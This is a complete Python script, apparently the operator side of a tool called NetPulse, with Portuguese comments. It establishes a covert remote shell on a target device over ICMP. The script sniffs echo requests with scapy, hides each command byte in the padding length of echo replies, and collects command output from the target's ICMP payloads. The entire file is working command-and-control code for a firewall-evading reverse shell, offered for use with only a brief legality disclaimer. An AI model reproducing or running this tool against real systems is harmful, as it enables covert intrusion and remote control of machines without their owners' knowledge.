#!/usr/bin/env python3
import os
import sys
import socket
import hashlib
import argparse
import threading

from scapy.all import sniff, Packet, ICMP, Ether, IP, sendp
from typing import Any

__version__ = "0.0.1"

# Inicializando váriaveis globais
# com valores padrão
shell = " \033[1;92m%target ❯\033[0m  "
payload = [0]
args = None
message = ""
payload_index = 0
listening = False
sending = False
establish = False
event = threading.Event()


def f_padding(padding: str, code: int) -> str:
    """
    Formata o padding usado nos pacotes ICMP.
    A função repete ou reduzi a string `padding` para ficar
    com a quantidade de caracteres exato de `code`.
    """
    # verifica se code é maior ou igual a
    # padding para então aumentar ou manter
    # a quantidade de caracteres da string
    if code >= len(padding):
        r_padding = padding * ((code // len(padding)) + 1)
        return r_padding[:code]
    # caso padding seja menor que code
    # irá reduzir a string
    else:
        return padding[:code]


def process_command(bytes: str) -> str:
    """
    Solicita o envio do comando e obtem a saída,
    além de fazer verificações de checksum.
    """
    global payload
    global payload_index
    global sending
    global listening
    global args
    global message
    global establish

    # caso não haja bytes para serem enviados
    # a função irá retornar uma string vázia
    if len(bytes) == 0:
        return ""

    payload_index = 0

    if args.verification:
        # pega o hash SHA1 do comando
        hash_res = hashlib.sha1(bytes.encode(args.decode)).hexdigest()
    else:
        # caso a verificação checksum esteja desativa
        # envia um '#' para simbolizar que não foi feito
        # a verificação checksum para o alvo
        hash_res = "#"

    # a conexão já foi estabelecida?
    if not establish:
        # o primeiro byte do payload é zero
        # isso faz com que o primeiro pacote não tenha um payload
        # assim o alvo pode usar o primeiro pacote para determinar
        # qual a quantidade de bytes que representa o tamanho do payload
        # e qual a outra parte insignificante
        payload = [0]
        establish = True
    else:
        payload = []

    # bytes a serem enviados
    # formato: <checksum>:<comando>
    bytes = f"{hash_res}:{bytes}"

    # percorre todos os bytes e transforma em números inteiros
    # e então adiciona a lista `payload`
    for byte in bytes:
        payload.append(ord(byte))

    # adiciona um zero ao final para dizer ao alvo
    # que a transmissão de bytes acabou
    payload.append(0)

    sending = True

    payload_len = len(payload)

    while sending or listening:
        try:
            # está transmitindo dados para o alvo?
            if sending:
                # calcula a porcentagem de dados que foram enviados
                p = (payload_index // payload_len) * 100

                # se zero, simboliza que o alvo ainda não enviou
                # um ICMP request para inicializar a troca de dados
                if p == 0:
                    print("\r* Waiting for a target request...", end="")
                else:
                    print(
                        f"\r* Sending bytes to the target... ({payload_index}/{payload_len}) {p}%",
                        end="",
                    )
            else:
                print(
                    f"              \r* Receiving data from the target... {len(message)} bytes",
                    end="",
                )
        except KeyboardInterrupt:
            # caso aconteça uma interrupção de teclado
            # o recebido de dados acaba
            # obs: o alvo ainda continuará enviando dados
            # porém eles não serão mais capturados
            listening = False
            return message

    print(f"\r{' '*50}\r", end="")

    message = message.split(":")

    checksum = message[0]
    content = ":".join(message[1:])

    # verifica se a flag -n não foi usada e
    # se o checksum retornada pelo alvo não foi uma '#'
    if args.verification and checksum != "#":
        content_hash = hashlib.sha1(content.encode(args.decode)).hexdigest()
        if content_hash != checksum:
            # imprime um erro caso a verificação checksum falhe
            print(
                "\033[1;91m[NETPULSE MESSAGE] SHA1 checksum failed, indicating potential corruption in the command output.\033[0m",
                file=sys.stderr,
            )
    message = ""

    return content


def connection(packet: Packet) -> None:
    """
    Função chamada pela função `sniff` toda vez que
    um pacote ICMP echo request é enviado a máquina.
    """
    global payload_index
    global listening
    global event
    global message
    global args
    global payload
    global sending

    # verifica se o programa está em um processo de recebimento ou de envio de dados
    # também fazem outras verificações para garantir que o pacote é um ICMP echo request
    if (listening or sending) and (ICMP in packet) and (packet[ICMP].type == 8):
        id_ = packet[ICMP].id
        seq = packet[ICMP].seq

        # está captando dados?
        if listening:
            try:
                # adiciona o payload do pacote recibido a `message`
                message += packet[ICMP].load.decode(args.decode)
            except AttributeError:
                # caso aconteça um AttributeError, provavelmente o pacote
                # enviado não continha um payload, isso significa que o
                # alvo terminou de enviar os dados necessários
                listening = False

            # envia um ICMP echo reply
            sendp(
                (
                    Ether(src=packet[Ether].dst, dst=packet[Ether].src)
                    / IP(src=packet[IP].dst, dst=packet[IP].src)
                    / ICMP(type=0, id=id_, seq=seq)
                ),
                count=1,
                iface=args.iface,
                verbose=False,
            )
            return

        code = payload[payload_index]

        # envia um pacote ICMP echo reply contendo
        # um payload do tamanho do código decimal
        # que será convertido pelo alvo
        echo_reply = (
            Ether(src=packet[Ether].dst, dst=packet[Ether].src)
            / IP(src=packet[IP].dst, dst=packet[IP].src)
            / ICMP(type=0, id=id_, seq=seq)
            / f_padding(args.padding, code)
        )

        sendp(echo_reply, count=1, iface=args.iface, verbose=False)

        # caso o código seja igual a zero e não seja o byte inicial
        # isso significa que o envio de dados terminou
        if code == 0 and payload_index != 0:
            listening = True
            sending = False
            return

        payload_index += 1


def create_main_parser() -> argparse.ArgumentParser:
    """Cria um parser de argumentos padrão para o programa."""
    parser = argparse.ArgumentParser(
        prog="netpulse",
        add_help=False,
        usage="netpulse [options] <target>",
        description=f"""
_   _  _____ ___________ _   _ _      _____ _____  
| \ | ||  ___|_   _| ___ \ | | | |    /  ___|  ___|
|  \| || |__   | | | |_/ / | | | |    \ `--.| |__  
| . ` ||  __|  | | |  __/| | | | |     `--. \  __| 
| |\  || |___  | | | |   | |_| | |____/\__/ / |___ 
\_| \_/\____/  \_/ \_|    \___/\_____/\____/\____/ 
                                                   
NetPulse v{__version__} - github.com/thekh49s/netpulse
""",
        epilog="NetPulse is a script that allows you to establish a remote shell\non a target device using the ICMP protocol. Use it responsibly and\nwith proper permission, as misuse may be considered illegal.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    # cria um grupo para opções vázio
    options = parser.add_argument_group()

    options.add_argument("-h", action="help", help="show this help message and exit")
    options.add_argument(
        "-v",
        action="version",
        version=f"NetPulse v{__version__} (Python {sys.version_info.major}.{sys.version_info.minor})",
        help="show version message and exit",
    )
    options.add_argument(
        "-p",
        dest="padding",
        metavar="<byte(s)>",
        help="padding byte in ICMP packets",
        default=".",
    )
    options.add_argument(
        "-i",
        dest="iface",
        metavar="<iface>",
        help="interface for monitoring",
    )
    options.add_argument(
        "-f",
        dest="filter",
        metavar="<filter>",
        help="rules for packet filtering",
        default="icmp and icmp[0] = 8",
    )
    options.add_argument(
        "-d",
        dest="decode",
        metavar="<decode>",
        help="decoding of received data",
        default="latin-1",
    )
    options.add_argument(
        "-n",
        dest="verification",
        action="store_false",
        help="do not perform integrity verification",
        default="latin-1",
    )
    options.add_argument(
        "-c",
        dest="command",
        metavar="<command>",
        help="execute <command> and exit the program. (DO NOT USE THIS OPTION TO ESTABLISH A CONNECTION)",
    )
    options.add_argument(
        "-s",
        dest="kernel_cfg",
        action="store_true",
        help="set/unset the kernel to ignore ICMP packets.",
    )

    parser.add_argument(
        "target",
        nargs="?",
        help=argparse.SUPPRESS,
    )

    return parser


def _sniff(event: threading.Event) -> None:
    """Responsavél por chamar a função `sniff` e tratar erros."""
    global args

    try:
        sniff(
            iface=args.iface,
            filter=args.filter,
            prn=connection,
            quiet=True,
            stop_filter=lambda x: event.is_set(),
        )
    except PermissionError:
        # caso aconteça um erro de permissão negada
        # imprime uma mensagem e tenta parar o evento
        event.is_set()
        print("[ERROR] Insufficient permissions. Try as root!")
        return


def kernel_configure() -> int:
    """Set/Unset the kernel to ignore ICMP packets."""
    filenames = [
        "/proc/sys/net/ipv4/icmp_echo_ignore_all",
        "/proc/sys/net/ipv6/icmp/icmp6_echo_ignore_all",
    ]
    for filename in filenames:
        print(f"[-] Reading file {filename}...")
        try:
            with open(filename, "r") as fp:
                file_value = fp.read().strip()
                if file_value == "0":
                    print("[+] Setting file value to 1.")
                    with open(filename, "w") as fp:
                        fp.write("1")
                    print("[-] System will now ignore all ICMP packets from this configuration.")
                elif file_value == "1":
                    print("[+] Setting file value to 0.")
                    with open(filename, "w") as fp:
                        print("[-] System will stop ignoring all ICMP packets from this configuration.")
                        fp.write("0")
                else:
                    print(f"[!] Value of the file is unrecognizable: {file_value}")
        except FileNotFoundError:
            print("[!] File was not found.")
        except PermissionError:
            print("[!] Insufficient permissions.")
    return 0


def main() -> int:
    """Função principal do programa."""
    global establish
    global event
    global args
    global shell

    # pega os argumentos do analisador
    parser = create_main_parser()
    args = parser.parse_args()

    if args.kernel_cfg:
        return kernel_configure()

    if args.target is None:
        parser.print_usage()
        print(
            "netpulse: error: the following arguments are required: target",
            file=sys.stderr,
        )
        return 1

    try:
        # verifica se o endereço fornecido é válido
        # e faz tradução DNS
        target = socket.gethostbyname(args.target)
    except socket.gaierror:
        print(f"[ERROR] Please verify that the target ({args.target}) is correct.")
        return 1

    # cria o thread para o sniffer
    sniff_thread = threading.Thread(target=_sniff, args=(event,))

    # inicializa o thread
    sniff_thread.start()

    # verifica se a flag -c está sendo usada
    # caso sim, executa o comando e encerra o programa
    if args.command is not None:
        # seta establish igual a True
        # OBS: NÃO SE DEVE USAR ESSA OPÇÃO
        # SE NÃO HOUVE UMA INTERAÇÃO COM
        # O ALVO ANTES
        establish = True
        print(process_command(args.command))

        # encerra o evento do sniffer e retorna
        # o código de saída = 0
        event.set()
        return 0

    while True:
        try:
            # input para processar os comandos
            output = process_command(input(shell.replace("%target", args.target)))

            # imprime a saída caso ela tenha um tamanho
            # diferente de zero
            if len(output):
                print(output)

        except KeyboardInterrupt:
            print("\n\033[1;93mQuitting...\033[0m")

            # tenta parar o evento do sniffer
            event.set()

            return 0


if __name__ == "__main__":
    sys.exit(main())
